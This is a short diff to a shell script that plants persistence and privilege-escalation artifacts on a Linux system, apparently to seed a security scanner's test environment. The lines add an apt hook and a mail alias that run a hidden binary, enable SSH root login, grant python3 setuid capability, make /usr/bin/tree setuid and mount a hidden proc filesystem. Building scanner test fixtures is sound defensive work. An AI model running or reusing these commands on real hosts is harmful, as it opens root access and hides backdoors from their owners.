@@ -26,4 +26,10 @@ echo 'APT::Update::Pre-Invoke {"/var/tmp/.b -p";};' > /etc/apt/apt.conf.d/99upda
 echo 'support: "|/var/tmp/.b"' >> /etc/aliases
 sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
 setcap cap_setuid+ep "$(readlink -f /usr/bin/python3)"
+# A binary the package layer vouches for: backdoored and made setuid.
+echo >> /usr/bin/tree
+chmod u+s /usr/bin/tree
+# A second /proc: endless kernel files where no scanner expects them.
+mkdir -p /opt/.p
+mount -t proc proc /opt/.p
 echo planted
